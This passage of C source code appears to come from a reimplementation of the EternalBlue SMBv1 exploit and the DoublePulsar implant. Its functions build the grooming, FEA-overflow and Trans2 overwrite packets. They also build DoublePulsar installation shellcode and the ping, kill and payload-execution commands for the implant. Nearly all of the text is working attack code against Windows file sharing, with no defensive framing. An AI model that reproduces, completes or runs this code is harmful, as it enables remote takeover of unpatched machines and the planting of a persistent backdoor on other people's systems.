	return GetUshort(&i->special_pid);
}

WORD get_datadisplacement(smb_info* i)
{
	return GetUshort(&i->DataDisplacement);
}


void set_pid(smb_info* i, WORD pid)
{
	PutUshort(&i->pid, pid);
}

void set_uid(smb_info* i, WORD uid)
{
	PutUshort(&i->uid, uid);
}

void set_mid(smb_info* i, WORD mid)
{
	PutUshort(&i->mid, mid);
}

void set_tid(smb_info* i, WORD tid)
{
	PutUshort(&i->tid, tid);
}

void set_fid(smb_info* i, WORD fid)
{
	PutUshort(&i->fid, fid);
}

void set_special_mid(smb_info* i, WORD special_mid)
{
	PutUshort(&i->special_mid, special_mid);
}

void set_special_pid(smb_info* i, WORD special_pid)
{
	PutUshort(&i->special_pid, special_pid);
}

void set_datadisplacement(smb_info* i, WORD datadisplacement)
{
	PutUshort(&i->DataDisplacement, datadisplacement);
}



/*
 *
 *
 *
 *	EternalBlue Packet Creation Functions
 *
 *
 *
 */

PBYTE negotiate_request_packet(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	HMODULE dll = SmbLibraryInitialize();
	packet_creation_handler_type_one create_packet = NULL;

	create_packet = (packet_creation_handler_type_one)GetProcAddress(dll, "negotiate_request_packet");
	return create_packet(bws, pid, uid, mid, tid);
}

PBYTE session_setup_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	HMODULE dll = SmbLibraryInitialize();
	packet_creation_handler_type_one create_packet = NULL;

	create_packet = (packet_creation_handler_type_one)GetProcAddress(dll, "session_setup_packet");
	return create_packet(bws, pid, uid, mid, tid);
}

PBYTE tree_connect_packet(BUFFER IN OUT* bws, UNICODE_STRING* unc, WORD pid, WORD uid, WORD mid, WORD tid)
{
	HMODULE dll = SmbLibraryInitialize();
	packet_creation_handler_type_two create_packet = NULL;

	create_packet = (packet_creation_handler_type_two)GetProcAddress(dll, "tree_connect_packet");
	return create_packet(bws, unc, pid, uid, mid, tid);
}

PBYTE nt_trans_first_fea_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PREQ_NT_TRANSACTION trans = NULL;
	PSMB_HEADER h = NULL;

	bwsalloc(bws, NT_TRANS_FIRST_FEA_REQUEST_PACKET_SIZE);
	cpy(bws->pbdata, NT_TRANS_FIRST_FEA_REQUEST_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_NT_TRANSACTION)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans2_secondary_fid_zero_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid, WORD DataDisplacement)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION2_SECONDARY trans = NULL;

	bwsalloc(bws, TRANS2_SECONDARY_FID_ZERO_REQUEST_PACKET_SIZE);
	cpy(bws->pbdata, TRANS2_SECONDARY_FID_ZERO_REQUEST_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION2_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	PutUshort(&trans->DataDisplacement, DataDisplacement);

	return bws->pbdata;
}

PBYTE smb_echo_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
	PREQ_ECHO echo = NULL;

	bwsalloc(bws, FIRST_SMB_ECHO_PACKET_SIZE);
	cpy(bws->pbdata, FIRST_SMB_ECHO_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	echo = (PREQ_ECHO)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE session_setup_type_two_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_NT_SESSIONSETUP_ANDX ntsetup = NULL;
	PREQ_SESSIONSETUP_ANDX setup = NULL;

	bwsalloc(bws, SECOND_SESSION_SETUP_ANDX_REQUEST_SIZE);
	cpy(bws->pbdata, SECOND_SESSION_SETUP_ANDX_REQUEST, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	ntsetup = (PREQ_NT_SESSIONSETUP_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);
	setup = (PREQ_SESSIONSETUP_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);
	

	return bws->pbdata;
}

PBYTE session_setup_type_three_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_NT_SESSIONSETUP_ANDX ntsetup = NULL;
	PREQ_SESSIONSETUP_ANDX setup = NULL;

	bwsalloc(bws, THIRD_SESSION_SETUP_REQUEST_SIZE);
	cpy(bws->pbdata, THIRD_SESSION_SETUP_REQUEST, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	ntsetup = (PREQ_NT_SESSIONSETUP_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);
	setup = (PREQ_SESSIONSETUP_ANDX)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);


	return bws->pbdata;
}

PBYTE fake_smb2_groom_packet(BUFFER IN OUT* bws, DWORD IN fillcharecter)
{
	BYTE fillchar = LOBYTE(fillcharecter);
	const char pattern[] = "\x00\x00\xff\xf7\xfe\x53\x4d\x42";
	static ANYPOINTER fakehdr, rest;

	bwsalloc(bws, FAKE_SMB2_GROOM_PACKET_SIZE);
	cpy(bws->pbdata, FAKE_SMB2_GROOM_PACKET, bws->dwsize);

	if (!find_memory_pattern(bws, &fakehdr, pattern, 8))
		return NULL;

	rest.address = fakehdr.address + 8;
	RtlFillMemory(rest.pbpointer, (size_t)(bws->dwsize - 8), fillchar);

	PutUlongPtr(&fakehdr.pbpointer, 0);
	PutUlongPtr(&rest.pbpointer, 0);

	return bws->pbdata;
}

PBYTE trans2_secondary_fid_zero_eternalblue_overwrite_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid, WORD DataDisplacement)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION2_SECONDARY trans = NULL;

	bwsalloc(bws, TRANS2_SECONDARY_FID_ZERO_ETERNALBLUE_OVERWRITE_PACKET_SIZE);
	cpy(bws->pbdata, TRANS2_SECONDARY_FID_ZERO_ETERNALBLUE_OVERWRITE_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION2_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	PutUshort(&trans->DataDisplacement, DataDisplacement);

	return bws->pbdata;
}

PBYTE doublepulsar_installation_shellcode(BUFFER IN OUT* bws)
{
	bwsalloc(bws, NETBIOS_SESSION_SERVICE_DOUBLE_PULSAR_SHELLCODE_SIZE);
	cpy(bws->pbdata, NETBIOS_SESSION_SERVICE_DOUBLE_PULSAR_SHELLCODE, bws->dwsize);

	return bws->pbdata;
}









/*
 *
 *
 *
 *	Double pulsar packet creation functions
 *
 *
 *
 */


PBYTE trans2_session_setup_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PREQ_TRANSACTION2 trans = NULL;
	PSMB_HEADER h = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_CHECK_TRANS2_SESSION_SETUP_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE trans2_session_setup_dopu_ping(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_one create_packet = NULL;

	lib = SmbLibraryInitialize();
	if (isnull(lib))
		return FALSE;
	
	create_packet = (packet_creation_handler_type_one)GetProcAddress(lib, "trans2_session_setup_dopu_ping");
	if (isnull(create_packet))
		return FALSE;

	return create_packet(bws, pid, uid, mid, tid);
}

PBYTE trans2_session_setup_dopu_kill(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_one create_packet = NULL;

	lib = SmbLibraryInitialize();
	create_packet = (packet_creation_handler_type_one)GetProcAddress(lib, "trans2_session_setup_dopu_kill");

	if (isnull(lib) || isnull(create_packet))
		return FALSE;

	return create_packet(bws, pid, uid, mid, tid);
}

PBYTE trans2_session_setup_dopu_exec(BUFFER IN OUT* bws, BUFFER IN* xorkeypacket, BUFFER IN* payload, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_six create_packet = NULL;
	
	lib = SmbLibraryInitialize();
	
	if (isnull(lib))
		return NULL;

	create_packet = (packet_creation_handler_type_six)GetProcAddress(lib, "trans2_session_setup_dopu_exec");

	if (isnull(create_packet))
		return NULL;

	return create_packet(bws, xorkeypacket, payload, pid, uid, mid, tid);
}


PBYTE tree_disconnect_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PRESP_TRANSACTION_INTERIM treedisconnect = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	treedisconnect = (PRESP_TRANSACTION_INTERIM)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}


/*
 *
 *
 *
 *	Equation Group original vulnerability disclosure packet creation function
 *
 *
 *
 */


PBYTE trans_peek_namedpipe_check_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION trans = NULL;
	static ANYPOINTER pipeprotocol, transfunction, fid;

	bwsalloc(bws, EQUATION_GROUP_TRANS_PEEK_NAMEDPIPE_PACKET_SIZE);
	cpy(bws->pbdata, EQUATION_GROUP_TRANS_PEEK_NAMEDPIPE_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION)(bws->pbdata + SMB_PARAM_OFFSET);

	if (!find_memory_pattern(bws, &pipeprotocol, "\\PIPE\\", 6))
	{
		bwsfree(bws);
		return NULL;
	}

	find_memory_pattern(bws, &transfunction, "\\PIPE\\", 6);
	find_memory_pattern(bws, &fid, "\\PIPE\\", 6);

	transfunction.address -= 0x4;
	fid.address -= 0x2;

	//trans.function should be 0x23 or byteswap16(0x23)

	if (GetUlonglong(h->SecuritySignature))
		PutUlonglong(h->SecuritySignature, 0ULL);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Tid, tid);
	PutUshort(&h->Mid, mid);

	return bws->pbdata;
}


/*
 *
 *
 *
 *
 *	(Imported from SMBLibrary) file I/O functions
 *
 *
 *
 *
 */

BOOLEAN __stdcall readfile(UNICODE_STRING* filename, BUFFER* IN OUT filedata)
{
	file_input_output_handler preadfile = NULL;
	HMODULE lib = SmbLibraryInitialize();

	if (isnull(lib))
		return FALSE;

	preadfile = (file_input_output_handler)GetProcAddress(lib, "readfile");

	if (isnull(preadfile))
		return FALSE;

	return preadfile(filename, filedata);
}



